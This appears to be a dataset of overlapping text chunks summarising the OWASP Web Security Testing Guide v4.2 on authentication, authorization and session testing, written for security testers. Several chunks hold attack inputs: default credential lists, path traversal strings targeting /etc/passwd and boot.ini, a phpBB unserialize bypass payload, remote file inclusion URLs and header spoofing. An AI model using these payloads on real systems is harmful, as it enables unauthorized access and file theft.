{"id": "WSTGv4_2-00060", "source": "wstg-v4.2_knowledge.json", "start_item": 1068, "end_item": 1084, "text": " known credentials from manufacturer documentation or online resources.\nBe cautious of account lockout policies when guessing credentials as multiple attempts can lock accounts.\nVerbose error messages can help identify valid usernames during testing.\nTesting for User Enumeration and Guessable User Accounts is crucial for finding default credentials.\nCommon usernames to test include 'admin', 'administrator', 'root', 'system', 'guest', and variations like 'qa', 'test'.\nCommon passwords to try include 'password', 'pass123', 'admin', 'guest', and others during testing.\nReviewing the JavaScript and page source can reveal potential username and password hints.\nBackup directories may contain source code or comments with important login information.\nNew accounts might have default passwords that users do not change, allowing unauthorized access.\nUnderstanding the User Registration page can help determine username formats and conventions.\nThe application may generate account names in a predictable sequence, suggesting the possibility of fuzzing all accounts recursively.\nValid usernames with incorrect passwords may prompt a different response from the application, indicating a brute force attack might be feasible on those usernames.\nTo check for predictable passwords, create multiple accounts quickly and compare the generated passwords; this can help identify patterns for brute force attacks.\nThe gray-box testing method relies on having some internal knowledge and involves talking to IT personnel about password usage and administrative access.\nExamine the user database for default credentials and ensure default passwords are changed and unused accounts are disabled.\nCheck configuration files for hard-coded usernames and passwords to enhance security testing.\nConsider using tools like Burp Intruder, THC Hydra, and Nikto 2 for security testing.\nAccount lockout mechanisms mitigate brute force attacks, such as login password guessing and 2FA code guessing.\nA balance is needed between protecting accounts from unauthorized access and allowing authorized access.\nTypically, accounts are locked after 3 to 5 unsuccessful attempts."}
{"id": "WSTGv4_2-00061", "source": "wstg-v4.2_knowledge.json", "start_item": 1085, "end_item": 1099, "text": "te brute force attacks, such as login password guessing and 2FA code guessing.\nA balance is needed between protecting accounts from unauthorized access and allowing authorized access.\nTypically, accounts are locked after 3 to 5 unsuccessful attempts.\nTesting involves checking both the lockout mechanism and the unlock mechanism.\nTesting steps include attempting incorrect logins and verifying lockout status after specified attempts.\nLockout mechanisms automatically unlock after a specific period (10 to 15 minutes).\nCAPTCHA can help prevent brute force attacks, but has potential weaknesses and should not replace a lockout mechanism.\nCommon CAPTCHA flaws include easily defeated challenges, improper server-side validation, and default successful solves.\nTo evaluate CAPTCHA effectiveness, various tests can be conducted such as attempting to bypass it through direct requests and fuzzing data entry points.\nAn unlock mechanism should be distinct from password recovery and can include measures like unique one-time links to prevent brute force attacks.\nDifferent levels of account unlock mechanisms can be applied based on risk, ordered from time-based lockouts to manual admin unlocks with identification.\nFactors to consider for account lockout implementation include assessing brute force risks, utilizing CAPTCHA, and understanding client-side mechanisms.\nA client-side lockout mechanism should be disabled for testing purposes.\nSetting the appropriate threshold for unsuccessful login attempts (typically 5 to 10) is crucial to balancing security and user access.\nAccounts can be unlocked manually by administrators, but this method can lead to inconvenience and potential denial-of-service issues.\nAlternative unlocking methods include timed lockouts (5 to 30 minutes) and self-service mechanisms, which must be secure against attacker exploitation.\nAuthentication is the process of verifying the digital identity of the sender of communication.\nTesting the authentication schema involves understanding and circumventing the authentication mechanism."}
{"id": "WSTGv4_2-00062", "source": "wstg-v4.2_knowledge.json", "start_item": 1100, "end_item": 1118, "text": "ich must be secure against attacker exploitation.\nAuthentication is the process of verifying the digital identity of the sender of communication.\nTesting the authentication schema involves understanding and circumventing the authentication mechanism.\nCommon issues in authentication methods include negligence, ignorance, and understatement of security threats, which can lead to bypassing authentication.\nBypassing authentication can involve skipping the log in page and directly calling an internal page.\nTampering with requests or manipulating URL parameters can trick the application into thinking the user is already authenticated.\nProblems with authentication schemas can arise during different stages of the software development life cycle (SDLC): design, development, and deployment.\nDuring the design phase, issues can include inadequate protection definitions and weak encryption protocols for credential transmission.\nIn the development phase, common errors include improper input validation and not following security best practices for the programming language.\nDeployment phase issues can stem from poor technical skills or lack of documentation in application setup.\nKey test objective is to ensure authentication is applied across all services that require it.\nBlack-box testing methodologies for bypassing authentication include forced browsing, parameter modification, session ID prediction, and SQL injection.\nDiscussion on Parameter Modification in web security.\nAn example demonstrating modification of authentication parameters to bypass security.\nURL example where a parameter 'authenticated' is set to 'no'.\nCode snippet simulating a GET request to modify authentication.\nServer response showing successful authentication when parameter is modified.\nTable displaying the basic structure of HTML returned upon successful authentication.\nImage: img_page152_1.jpeg\nSession identifiers (session IDs) are used by web applications to manage authentication.\nPredictable session ID generation poses a security risk, allowing unauthorized access to applications.\nIf session IDs increase linearly, they are easier for attackers to guess and exploit."}
{"id": "WSTGv4_2-00063", "source": "wstg-v4.2_knowledge.json", "start_item": 1119, "end_item": 1137, "text": "n IDs) are used by web applications to manage authentication.\nPredictable session ID generation poses a security risk, allowing unauthorized access to applications.\nIf session IDs increase linearly, they are easier for attackers to guess and exploit.\nFigures referenced demonstrate the vulnerabilities involved with session ID predictability.\nImage: img_page153_1.jpeg\nImage: img_page153_2.jpeg\nSQL Injection is a widely known attack technique.\nThis section does not describe SQL Injection in detail as there are several sections in this guide that explain injection techniques.\nA figure demonstrates how a simple SQL injection attack can sometimes bypass the authentication form.\nImage: img_page154_1.jpeg\nImage: img_page154_2.jpeg\nThe page discusses Gray-Box Testing in web security, particularly focusing on how an attacker can exploit vulnerabilities to retrieve application source code.\nIt provides a specific example of a vulnerability in PHPBB 2.0.13 involving authentication bypass using the `unserialize()` function.\nThe PHP code snippet demonstrates how user cookies are processed and how an attacker can manipulate the input to bypass authentication checks.\nThe page explains that in PHP, a comparison between a string value and a boolean value can always be true, which aids in the exploitation of the authentication process.\nAn example payload for bypassing the authentication is provided: `a:2:{s:11:\"autologinid\";b:1;s:6:\"userid\";s:1:\"2\";}`.\nThe page lists tools such as WebGoat and OWASP Zed Attack Proxy (ZAP) relevant for conducting web security tests.\nImage: img_page155_1.png\nCredentials are commonly used for authentication, but users often struggle to manage them effectively across multiple applications.\nTechnologies like 'remember me' functionality and password managers help users manage their credentials, but they can increase security risks.\nTesting objectives include validating secure session management and protecting user credentials.\nIt is important to ensure credentials are not stored in client-side applications; they should be replaced by server-side generated tokens."}
{"id": "WSTGv4_2-00064", "source": "wstg-v4.2_knowledge.json", "start_item": 1138, "end_item": 1151, "text": "ecurity risks.\nTesting objectives include validating secure session management and protecting user credentials.\nIt is important to ensure credentials are not stored in client-side applications; they should be replaced by server-side generated tokens.\nPotential security threats include ClickJacking and CSRF attacks that can exploit stored credentials.\nToken management should be analyzed, especially around token lifetimes and expirations to prevent unauthorized access.\nGood practices for session management and credential storage involve not storing credentials in clear text or easily retrievable forms.\nTesting for Browser Cache Weaknesses (WSTG-ATHN-06) involves checking if an application prevents storing sensitive data in the browser cache.\nBrowsers use caching for performance and history for user convenience but may expose sensitive information.\nTest objectives include reviewing if sensitive data is stored client-side and if unauthorized access is possible.\nA basic test involves entering sensitive information, logging out, and using the Back button to check if sensitive data is retrievable without authentication.\nTo prevent sensitive information from being accessed via the Back button, one can deliver pages over HTTPS and set Cache-Control directives.\nTesters should ensure no sensitive data is leaked into the browser cache by using a proxy and checking server responses for caching directives.\nCache directives such as 'no-cache' and 'must-revalidate' are important for preventing sensitive information from being cached.\nTesters should ensure that pages containing sensitive information like credit card numbers use appropriate cache directives to avoid storing information on the disk.\nCaching behavior might vary between different browsers and operating systems, and it is necessary to know where cached data is stored for effective testing.\nDetails on cached information can be reviewed using browser developer tools and specific URLs like 'about:cache' in Firefox.\nMobile browsers handle cache directives differently; testers should start with clean caches and utilize browser modes designed for mobile testing."}
{"id": "WSTGv4_2-00065", "source": "wstg-v4.2_knowledge.json", "start_item": 1152, "end_item": 1168, "text": "ormation can be reviewed using browser developer tools and specific URLs like 'about:cache' in Firefox.\nMobile browsers handle cache directives differently; testers should start with clean caches and utilize browser modes designed for mobile testing.\nTesting methodologies include gray-box testing, which allows access to server response headers and HTML code while simulating a user-like approach.\nThe page is from the Web Security Testing Guide v4.2.\nIt discusses the importance of credentials for testing sensitive pages.\nIt references the OWASP Zed Attack Proxy as a tool for web security testing.\nThere is a code snippet titled 'Caching in HTTP' that suggests topics related to web security.\nThe static password is a common authentication mechanism, but user usability often compromises its strength.\nMany users still choose weak passwords such as '123456', 'password', and 'qwerty'.\nTesting objectives include evaluating password length, complexity, reuse, and aging requirements to determine resistance to brute force attacks.\nKey test elements involve permissible and forbidden characters in passwords, password change policies, and history maintenance.\nNIST and NCSC advise against mandatory password expiry, though some standards like PCI DSS may require it.\nImplementing a strong password policy can mitigate risks associated with weak passwords, along with additional authentication controls like two-factor authentication.\nSecurity questions, often called 'secret' questions, are used for password recovery and as additional security measures.\nSecurity questions and answers should ideally be known only by the user and be non-guessable.\nPre-generated questions tend to be simplistic and can lead to insecure answers, as they may be known by friends or easily guessable.\nExamples of insecure pre-generated questions include 'What is your mother's maiden name?' and 'What is your favorite color?'.\nUser-generated questions can also be insecure and bypass the original purpose of security questions.\nExamples of insecure self-generated questions include simple math problems or repeating user details like 'What is your username?'."}
{"id": "WSTGv4_2-00066", "source": "wstg-v4.2_knowledge.json", "start_item": 1169, "end_item": 1184, "text": "favorite color?'.\nUser-generated questions can also be insecure and bypass the original purpose of security questions.\nExamples of insecure self-generated questions include simple math problems or repeating user details like 'What is your username?'.\nTesting for weak security questions involves assessing their complexity and user answer patterns, as well as potential brute force attacks.\nThe testing process for weak security questions includes creating new accounts and attempting to learn the types of questions asked.\nTesting for weak self-generated questions includes creating accounts or configuring password recovery properties.\nSelf-generated security questions can be vulnerable if users can create insecure questions.\nEnumerating weak self-generated questions is possible if usernames can be guessed or enumerated.\nBrute-forcible answers should be tested to determine if there is a lockout mechanism after incorrect attempts.\nAssess the application's requirement for answering security questions; commonly only one is needed.\nThe strength of security questions must be evaluated against the ease of obtaining answers through social engineering or online searches.\nExploit a security question scheme by identifying which questions have public or factual answers accessible online.\nResearch potential answers to security questions to select the most likely correct answer based on statistical analysis.\nLockout periods and guessing attempts can be leveraged by attackers for Denial of Service against legitimate users.\nWeak security question schemes are only as strong as their weakest question.\nThe password change/reset functionality allows users to self-service their accounts without administrator intervention.\nThe primary concern is the application's resistance to unauthorized password changes and resets, especially by non-administrative users.\nKey tests include ensuring that users cannot change/reset passwords for accounts other than their own and checking for vulnerabilities to CSRF attacks.\nAssess the security of secret questions used in the password reset process, as relying solely on email security may not be sufficient."}
{"id": "WSTGv4_2-00067", "source": "wstg-v4.2_knowledge.json", "start_item": 1185, "end_item": 1198, "text": "s cannot change/reset passwords for accounts other than their own and checking for vulnerabilities to CSRF attacks.\nAssess the security of secret questions used in the password reset process, as relying solely on email security may not be sufficient.\nIt is insecure if the password reset tool displays the new password to the user, allowing for immediate account compromise.\nForcing users to immediately change their password upon reset can prevent stealthy access to the account, but still allows the attacker some time to log in.\nThe best practice for password reset notifications is to send a reset link to the registered email address, thereby increasing security.\nInsecure password reset scenarios may reveal old passwords in clear text, indicating poor storage practices (non-hashed) for passwords.\nBest practice for security includes using randomly generated passwords via secure algorithms that cannot be derived.\nPassword reset functionality should include a confirmation step to limit denial-of-service attacks by sending a link to the user with a random token that must be visited to reset the password.\nA strong security measure requires the application to request the old password before allowing a change, preventing unauthorized password changes during valid sessions.\nThe password change/reset process should incorporate protective measures such as user re-authentication or confirmation screens.\nTesting for vulnerabilities in alternative authentication channels is essential, even if the primary mechanisms appear secure.\nAlternative channels may include mobile apps, desktop applications, call centers, and different versions of the website.\nIdentifying alternative channels is crucial as they can bypass primary authentication methods or expose sensitive information.\nExamples of alternative user interaction channels include mobile-optimized websites and accessibility-focused sites.\nAlternative testing channels may also involve site functionality without cookies or JavaScript.\nDocumentation of alternative channels is important for understanding potential vulnerabilities."}
{"id": "WSTGv4_2-00068", "source": "wstg-v4.2_knowledge.json", "start_item": 1199, "end_item": 1218, "text": "mobile-optimized websites and accessibility-focused sites.\nAlternative testing channels may also involve site functionality without cookies or JavaScript.\nDocumentation of alternative channels is important for understanding potential vulnerabilities.\nExample provided: primary website with secure authentication and a mobile site with weaker security measures.\nTest Objectives: Identify alternative authentication channels and assess security measures for bypasses.\nPrimary mechanism testing involves understanding account issuance, creation, and password management.\nIdentify alternative channels by reviewing site content, HTTP logs, and using search engines.\nUse of code to find alternative channels in HTTP proxy logs: ```code Searching HTTP proxy logs, recorded during previous information gathering and testing, for strings such as \"mobile\", \"android\", blackberry\", \"ipad\", \"iphone\", \"mobile app\", \"e-reader\", \"wireless\", \"auth\", \"sso\", \"single sign on\" in URL paths and body content. ```\nFor each channel, confirm if user accounts are shared and if similar functionality exists.\nCreate a comparison grid for authentication functionality across channels.\nObserve session management to identify potential overlap between channels.\nMention alternative channels in testing reports even if they are out of scope or marked as information only.\nTest cases for authentication tests should be utilized in web security testing.\nIt is important to ensure a consistent authentication policy across all channels for security.\nSection 4.5 focuses on Authorization Testing as part of the Web Security Testing Guide v4.2.\nDifferent aspects of Authorization Testing covered include:\n- 4.5.1 Testing Directory Traversal File Include\n- 4.5.2 Testing for Bypassing Authorization Schema\n- 4.5.3 Testing for Privilege Escalation\n- 4.5.4 Testing for Insecure Direct Object References\nDirectory traversal and file include vulnerabilities can allow unauthorized file access.\nInput validation is crucial to prevent path traversal attacks.\nAccess Control Lists (ACL) help define user permissions for file access and execution."}
{"id": "WSTGv4_2-00069", "source": "wstg-v4.2_knowledge.json", "start_item": 1219, "end_item": 1231, "text": " References\nDirectory traversal and file include vulnerabilities can allow unauthorized file access.\nInput validation is crucial to prevent path traversal attacks.\nAccess Control Lists (ACL) help define user permissions for file access and execution.\nCommon attacks related to this type of vulnerability include dot-dot-slash attacks (../), and attackers can exploit these deficiencies to read or include files.\nThe testing process involves Input Vectors Enumeration and Testing Techniques to assess vulnerabilities.\nBlack-Box Testing is mentioned as a method for discovering path traversal and file include flaws.\nThe tester must enumerate all components of an application that accept user input for vulnerability assessment.\nChecks should include analyzing request parameters for file operations, unusual file extensions, and variable names.\nExamples of potentially vulnerable HTTP requests include `http://example.com/getUserProfile.jsp?item=ikki.html`, `http://example.com/index.php?file=content`, and `http://example.com/main.cgi?home=index.htm`.\nIdentification of cookies that are dynamically generated by the web application is important, such as cookie samples provided in the text.\nTesting input validation functions is crucial to prevent inclusion attacks, such as attempting to read system files like `/etc/passwd` using paths like `../../../../etc/passwd`.\nKnowledge of the system's file structure is necessary for successful testing; requesting non-applicable file paths such as `/etc/passwd` from an IIS server is ineffective.\nExternal files and scripts can be included via URLs, as shown with examples like `http://example.com/index.php?file=http://www.owasp.org/malicioustxt`.\nLocal filesystem access can also be probed through arguments in URLs, such as `http://example.com/index.php?file=file:///etc/passwd`.\nProbing local and network services is possible with URLs like `http://example.com/index.php?file=http://localhost:8080` and `http://example.com/index.php?file=http://192.168.0.2:9080`.\nExample demonstrates how to expose CGI source code without path traversal: `http://example.com/main.cgi?home=main.cgi`"}
{"id": "WSTGv4_2-00070", "source": "wstg-v4.2_knowledge.json", "start_item": 1232, "end_item": 1250, "text": "RLs like `http://example.com/index.php?file=http://localhost:8080` and `http://example.com/index.php?file=http://192.168.0.2:9080`.\nExample demonstrates how to expose CGI source code without path traversal: `http://example.com/main.cgi?home=main.cgi`\nEncoding requests with special characters (like `.` and `%00`) can bypass file extension controls or prevent script execution.\nTip: Developers often fail to validate all forms of encoding; testers should try various encoding schemes if initial attempts fail.\nDifferent operating systems use different characters for path separators, including: Unix-like (`/`), Windows (`\\\n/`), and classic macOS (`:`).\nCharacter encoding mechanisms, such as URL encoding and double URL encoding, can impact path traversal attempts, with examples provided for `../` and `..\\`.\nUnicode/UTF-8 Encoding can represent directory traversal characters under compatible systems (e.g., `..%c0%af` represents `../`).\nWindows OS is flexible in parsing file paths, allowing certain characters (like `<`, `>`, or even extra markers) at the end of paths without changing the command outcome.\nWindows API discards periods and spaces in filenames when used in shell commands.\nWindows UNC filepaths can reference files on SMB shares and may lead to credential leaks if exploited.\nWindows NT Device Namespace allows access to file systems using alternative paths, including specific device references like \\. GLOBALROOT\\Device\\HarddiskVolume1\\.\nGray-box testing combines aspects of both black-box and white-box testing, allowing for easier search of vulnerabilities via source code review.\nCommon functions in PHP, JSP, and ASP that could lead to vulnerabilities include include(), require(), and file access methods.\nPath traversal vulnerabilities can often be introduced when dynamic web pages utilize database-stored parameters.\nThe page is focused on web security testing, specifically on file traversal vulnerabilities.\nIt provides a code snippet related to manipulating file paths to demonstrate a potential security issue:\n| filename = Request.QueryString( \"file\" ); |\n| --- |\n| Replace(filename, | \"/\" , \"\\\"); |\n| Replace(filename, \" ..\\\" ,\"\"); |"}
{"id": "WSTGv4_2-00071", "source": "wstg-v4.2_knowledge.json", "start_item": 1251, "end_item": 1274, "text": "sal vulnerabilities.\nIt provides a code snippet related to manipulating file paths to demonstrate a potential security issue:\n| filename = Request.QueryString( \"file\" ); |\n| --- |\n| Replace(filename, | \"/\" , \"\\\"); |\n| Replace(filename, \" ..\\\" ,\"\"); |\nInstructions on how to test for file traversal flaws using different patterns:\n1. file=....//....//boot.ini\n2. file=....\\....\\boot.ini\n3. file= ..\\..\\boot.ini\nIt mentions various tools helpful for testing these vulnerabilities:\n- DotDotPwn: A fuzzer for directory traversal issues.\n- Path Traversal Fuzz Strings used from WFuzz Tool.\n- OWASP ZAP: A security testing tool.\n- Burp Suite: A web vulnerability scanner.\n- Encoding/Decoding tools for data manipulation.\n- String searcher ‘grep’ for searching strings in files.\n- DirBuster: A tool to brute force directories and files.\nA reference is provided for a whitepaper regarding phpBB Attachment Mod Directory Traversal HTTP POST Injection.\nA reference is made to 'Windows File Pseudonyms: Pwnage and Poetry', suggesting further reading on file manipulation or security issues.\nTesting for Bypassing Authorization Schema (ID: WSTG-ATHZ-02) focuses on verifying authorization schema implementation.\nKey questions for tests include: access to resources without authentication, after logout, or by users with different roles.\nTest objectives include assessing horizontal or vertical access.\nHorizontal Bypassing Authorization involves checking access to resources across users with the same role.\nTesting involves generating two users with identical privileges, maintaining separate sessions, and altering session identifiers to diagnose vulnerabilities.\nAn application is deemed vulnerable if responses from different users for the same request are identical, suggest success, or reveal private data.\nExample provided for accessing the viewSettings function for different accounts demonstrates the testing method.\nHTTP request example for the viewSettings function, highlighting POST method and session handling.\nExamples of legitimate response structure demonstrating a successful HTTP request for user details.\nTable outlining potential application vulnerabilities for lateral movement attacks."}
{"id": "WSTGv4_2-00072", "source": "wstg-v4.2_knowledge.json", "start_item": 1275, "end_item": 1290, "text": "wSettings function, highlighting POST method and session handling.\nExamples of legitimate response structure demonstrating a successful HTTP request for user details.\nTable outlining potential application vulnerabilities for lateral movement attacks.\nDefinition and explanation of vertical authorization bypass and the testing methodology associated with it.\nStep-by-step guide for testing vertical authorization bypass for applications based on user roles.\nIllustration of banking site roles and permissions relevant to authorization schema.\nRoles and their associated permissions: Administrator has full control including delete, Manager can modify, add and read, Staff can read and modify, and Customer has read-only access.\nVulnerability criteria: If lower-level users (Customer, Staff, Manager) can perform higher-level functions (e.g., Staff accessing Manager functions), the application is considered vulnerable.\nIllustration of potential vulnerabilities through the `deleteEvent` function, where improper access might allow unauthorized users to execute a delete command.\nExample of HTTP POST request showing the generated request when accessing the `deleteEvent` function from the administrator account.\nDescription of how an attacker might exploit the vulnerability by utilizing a session cookie from a lower-privileged user to execute administrator functions and check for responses that indicate a successful operation.\nExample of a vulnerable URL for the addUser function: https://www.example.com/admin/addUser\nHTTP POST request format for addUser: POST /admin/addUser HTTP/1.1\nQuery parameters in the POST request: userID=fakeuser&role=3&group=grp001\nConsiderations for non-administrative users attempting to call the addUser function.\nTesting access to files based on user role; example includes accessing CVs in an S3 bucket.\nVulnerability noted if a normal user can retrieve, modify, or delete CVs uploaded by different roles.\nTesting for special request header handling with non-standard headers like X-Original-URL and X-Rewrite-URL\nAccess control weakness if the application processes these headers to override targeted URLs."}
{"id": "WSTGv4_2-00073", "source": "wstg-v4.2_knowledge.json", "start_item": 1291, "end_item": 1305, "text": "dify, or delete CVs uploaded by different roles.\nTesting for special request header handling with non-standard headers like X-Original-URL and X-Rewrite-URL\nAccess control weakness if the application processes these headers to override targeted URLs.\nSteps to detect support for X-Original-URL and X-Rewrite-URL, including sending normal requests and requests with custom headers.\nApplication responses with 404 status code or 'resource not found' messages indicate support for special request headers.\nValidation of headers like X-Original-URL or X-Rewrite-URL is critical for bypassing access control restrictions.\nValidating these headers involves sending requests that specify allowed URL through the main request while using the actual target URL in the specified headers.\nAdministrative functionality often restricted to local networks can be tested by manipulating specific HTTP headers such as X-Forwarded-For, X-Remote-IP, etc.\nTesting with loopback addresses and RFC1918 address spaces can assist in bypassing access controls.\nIncluding a port may help bypass security measures like web application firewalls.\nThe principle of least privilege should be exercised to prevent unauthorized access.\nRecommended tools include OWASP Zed Attack Proxy (ZAP) and Port Swigger Burp Suite alongside their respective extensions.\nThe section discusses privilege escalation, where a user gains access to more resources or functionality than intended.\nPrivilege escalation can result from application flaws allowing users to modify roles or privileges.\nVertical escalation refers to gaining access to higher privileges (e.g., admin), while horizontal escalation refers to accessing data of other users with similar privileges.\nTest objectives include identifying injection points related to privilege manipulation and attempting to bypass security measures.\nTesting roles/privileges involves trying to access functions as different users to check security integrity.\nA specific example is given of an HTTP POST request that demonstrates privilege manipulation by changing parameters to access restricted data."}
{"id": "WSTGv4_2-00074", "source": "wstg-v4.2_knowledge.json", "start_item": 1306, "end_item": 1320, "text": "esting roles/privileges involves trying to access functions as different users to check security integrity.\nA specific example is given of an HTTP POST request that demonstrates privilege manipulation by changing parameters to access restricted data.\nWeb security testing includes manipulating user profiles, where changing the hidden field value may lead to unauthorized access, like elevating privileges.\nExample of a server response shows hidden fields and cookies indicating user session information.\nModifying a parameter in an error message sent by the server can potentially lead to an escalation of privileges.\nTesting includes ensuring that modifying certain parameters, like PVValid, does not allow unauthorized authentication as an administrator.\nIP address manipulation can help bypass security mechanisms that limit access based on IP. In the example, changing the X-Forwarded-For header value could help evade detection of failed login attempts.\nURL traversal tests involve checking for unauthorized page access in a web application.\nIf URL authorization checks are done only by partial URL match, it may allow workaround through URL encoding techniques.\nFunctions to check URL authorization include: `startswith()`, `endswith()`, `contains()`, `indexOf()`.\nWeak Session IDs can be vulnerable to brute force attacks, especially if based on predictable algorithms like MD5.\nAn example of a weak Session ID generation method is MD5(Password + UserID), which can be easily guessed or generated by attackers.\nReferences include whitepapers and tools such as OWASP Zed Attack Proxy (ZAP).\nInsecure Direct Object References (IDOR) allow attackers to bypass authorization by directly accessing objects based on user-supplied input.\nIDOR vulnerabilities can grant unauthorized access to database records, files, and other objects in a system.\nTesting for IDOR requires mapping all locations where user input is used to reference objects without proper authorization checks.\nTesters should modify parameters used to reference objects to verify if unauthorized access is possible."}
{"id": "WSTGv4_2-00075", "source": "wstg-v4.2_knowledge.json", "start_item": 1321, "end_item": 1336, "text": "s in a system.\nTesting for IDOR requires mapping all locations where user input is used to reference objects without proper authorization checks.\nTesters should modify parameters used to reference objects to verify if unauthorized access is possible.\nHaving multiple users during testing helps identify unauthorized access scenarios more effectively, as testers can directly access different owned objects.\nExamples include modifying parameters such as invoice IDs in URL queries to check for unauthorized access to different user objects.\nThe page discusses web security vulnerabilities related to direct object references in query parameters.\nExamples are provided illustrating how parameters like 'user', 'file', and 'menuitem' can be manipulated to access unauthorized functionality or data.\nCode examples show how to craft specific URLs to test these vulnerabilities: ```code http://foo.bar/changepassword?user=someuser ```, ```code http://foo.bar/showImage?img=img00011 ```, ```code http://foo.bar/accessPage?menuitem=12 ```\nA specific method for testing is outlined: attempt to modify parameters to access information or functionality that should be restricted.\nIt mentions the potential for exploiting directory/path traversal vulnerabilities in conjunction with direct object references.\nSession Management Testing is crucial for web security.\nTesting for Session Management Schema involves assessing the structure of session data.\nCookies Attributes are important to test to ensure security features like 'HttpOnly' and 'Secure' are set properly.\nSession Fixation testing prevents attackers from hijacking a user's session.\nExposed Session Variables testing checks if session data is improperly exposed to users.\nCross Site Request Forgery (CSRF) testing ensures that requests are not executed without user consent.\nLogout Functionality must be tested to validate that it fully terminates the user session.\nSession Timeout testing confirms that sessions automatically expire after a period of inactivity.\nSession Puzzling testing involves verifying that sessions are correctly mapped to user actions and states."}
{"id": "WSTGv4_2-00076", "source": "wstg-v4.2_knowledge.json", "start_item": 1337, "end_item": 1351, "text": "te that it fully terminates the user session.\nSession Timeout testing confirms that sessions automatically expire after a period of inactivity.\nSession Puzzling testing involves verifying that sessions are correctly mapped to user actions and states.\nSession Hijacking testing assesses vulnerability to unauthorized access through hijacked sessions.\nSession Management is a crucial component of web applications that allows for maintaining user state without continuous authentication.\nCookies are fundamental to session management, as they store user credentials and data between requests to the server.\nExploiting weak cookies can lead to session hijacking, where an attacker assumes the identity of a legitimate user.\nCookies should be created in a secure and unpredictable manner to prevent forgery or replication by attackers.\nAttack patterns in session management testing include cookie collection, reverse engineering of cookie generation, and cookie manipulation with the goal of unauthorized access.\nAnother attack involves overflowing a cookie to disrupt application behavior and potentially execute malicious code.\nTest objectives include gathering session tokens, ensuring randomness in token generation, and modifying unprotected cookies.\nBlack-box testing includes evaluating Cookie settings such as Set-Cookie directives and their security features.\nTest whether Cookie operations occur over unencrypted transport and if Cookies can be forced without encryption.\nUnderstand the persistence of Cookies by assessing their expiration times and ensuring transient Cookies are configured correctly.\nEvaluate HTTP/1.1 and HTTP/1.0 Cache-Control settings to protect Cookies, illustrated by code examples.\nAnalyze how Cookies are created and managed within the application, keeping a record of cookie creation, behavior, and associated pages.\nDetermine which cookies are essential for certain application parts by experimenting with cookie removal or modification.\nSession tokens should be assessed for randomness, uniqueness, and resistance to analysis; information leakage should also be examined."}
{"id": "WSTGv4_2-00077", "source": "wstg-v4.2_knowledge.json", "start_item": 1352, "end_item": 1371, "text": "ine which cookies are essential for certain application parts by experimenting with cookie removal or modification.\nSession tokens should be assessed for randomness, uniqueness, and resistance to analysis; information leakage should also be examined.\nThe structure of Session IDs should not contain identifiable information or specific data; they should be generic and reference data server-side.\nExamples include the examination of Session ID encoding and hashing methods to ensure adequate obfuscation.\nBase64 and MD5 examples are given for encoding.\nObfuscation analysis can reveal format and underlying data.\nHybrid tokens may combine elements like user IDs and encoded data.\nPatterns in Session IDs can indicate static and variable data components.\nTesting involves identifying static parts, clear-text information, and analyzing predictability.\nTools for analysis may include statistical or cryptanalytic methods.\nTime and simultaneous connections are critical in gathering reliable samples.\nIncremental analysis of variable elements is necessary to understand patterns.\nQuestions to assess Session ID structure include randomness, reproducibility, and time-linkage.\nSession IDs predictability can lead to session hijacking if they can be deduced by an attacker.\nCharacteristics for secure cookies include unpredictability, tamper resistance, expiration, and secure flag.\nTo ensure unpredictability, cookies should use random values or cryptography to avoid easy guessing.\nTamper resistance requires that cookies resist unauthorized modifications, often through the use of encrypted hashes.\nCookies must have an appropriate expiration period to mitigate replay risks.\nThe secure flag indicates that a cookie should only be transmitted over encrypted channels, protecting against eavesdropping.\nWhen analyzing cookies, keep track of patterns, time of capture, and different variable influences on cookie values.\nUnderstanding the structure of cookies involves analyzing charset, components, delimiters, and possible constants or variances in values.\nDifferent field types for data: ID (hexadecimal), CR (small integer), TM and LM (large integer), S (alphanumeric)."}
{"id": "WSTGv4_2-00078", "source": "wstg-v4.2_knowledge.json", "start_item": 1372, "end_item": 1394, "text": "derstanding the structure of cookies involves analyzing charset, components, delimiters, and possible constants or variances in values.\nDifferent field types for data: ID (hexadecimal), CR (small integer), TM and LM (large integer), S (alphanumeric).\nBrute force attacks depend on predictability and randomness of Session IDs.\nSmaller variation in Session IDs with longer validity increases success likelihood for brute force attacks.\nLong Session IDs with higher variance and shorter validity decrease brute force attack success.\nConsiderations for brute-force attacks include Session ID space, length of Session ID, and delays between connection attempts.\nGray-Box Testing allows testers to access session management schema, checking the predictability of session tokens.\nEncouraged use of cryptographic algorithms with a key length of 256 bits for session tokens (e.g., AES).\nSession ID should be at least 50 characters in length.\nSession tokens should have a defined timeout based on application data criticality.\nCookie configurations can be non-persistent, secure (set only on HTTPS), and HTTPOnly (not readable by scripts).\nTools mentioned: OWASP Zed Attack Proxy Project (ZAP) for session token analysis, Burp Sequencer, YEHG’s JHijack.\nThe page contains references to important whitepapers and RFCs relevant to web security testing.\nKey references include:\n- RFC 2965: 'HTTP State Management Mechanism'\n- RFC 1750: 'Randomness Recommendations for Security'\n- Michal Zalewski's works on TCP/IP sequence number analysis.\n- Global Hauri ViRobot Server cookie overflow incident from DMA.\n- Gunter Ollmann's work on web-based session management.\n- OWASP Code Review Guide is mentioned as a reference.\nCookies are a key attack vector in web security and should be properly protected.\nHTTP is stateless; sessions are created to manage user state, typically using cookies.\nCookies can be set by servers via 'Set-Cookie' headers and can serve various purposes like session management, personalization, and tracking.\nTo secure cookies, developers can use attributes such as Secure and HttpOnly.\nThe Secure attribute ensures cookies are only sent over HTTPS to prevent exposure in unencrypted requests."}
{"id": "WSTGv4_2-00079", "source": "wstg-v4.2_knowledge.json", "start_item": 1395, "end_item": 1411, "text": " purposes like session management, personalization, and tracking.\nTo secure cookies, developers can use attributes such as Secure and HttpOnly.\nThe Secure attribute ensures cookies are only sent over HTTPS to prevent exposure in unencrypted requests.\nThe HttpOnly attribute prevents access to cookies via client-side scripts, protecting against session leakage.\nXSS attacks can still be executed if an attacker sends requests in place of the user, limiting the scope of XSS attack vectors.\nThe Domain attribute ensures that only hosts belonging to the specified domain can set cookies for that domain.\nThe path attribute works in conjunction with the domain to define the scope of cookies that can be sent in requests.\nIf the domain attribute is overly broad, it can lead to security vulnerabilities across subdomains.\nThe Expires attribute is used to manage the lifespan of cookies, enabling persistent cookies and controlling their deletion.\nThe SameSite attribute helps mitigate the risk of cross-origin information leakage and can reduce the risk of CSRF attacks, configurable in modes such as Strict, Lax, and None.\nSameSite cookie value options: Strict, Lax, None.\nStrict: Cookies sent only to first-party context, may require re-login in certain cases.\nLax: Cookies sent for same-site requests and some third-party requests, improves user experience.\nNone: Cookies sent on cross-site requests if Secure attribute is also set, forces secure attribute usage.\nCookie Name Prefixes: mechanism for enhancing security and providing integrity and confidentiality to 